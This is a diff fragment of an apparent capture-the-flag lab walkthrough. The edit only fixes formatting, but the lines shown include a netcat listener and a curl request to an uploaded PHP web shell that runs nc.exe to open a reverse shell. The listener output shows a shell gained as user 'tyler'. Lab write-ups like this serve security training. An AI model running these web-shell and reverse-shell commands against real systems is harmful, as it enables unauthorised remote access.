@@ -173,10 +173,10 @@ Now we can interact with the files we uploaded to get a reverse shell:
 nc -lvnp 8080
 
 # Interact with the files we uploaded to trigger reverse shell
- curl http://10.129.143.191:8808/cmd.php?cmd=nc.exe+-e+cmd+10.10.14.206+8080
+curl http://10.129.143.191:8808/cmd.php?cmd=nc.exe+-e+cmd+10.10.14.206+8080
  ```
- After using curl, we will get a response in our nc listener, granting us a shell as the user tyler:
- ```shell
+After using curl, we will get a response in our nc listener, granting us a shell as the user tyler:
+```shell
 listening on [any] 8080 ...
 connect to [10.10.14.206] from (UNKNOWN) [10.129.143.191] 51961
 Microsoft Windows [Version 10.0.17134.228]
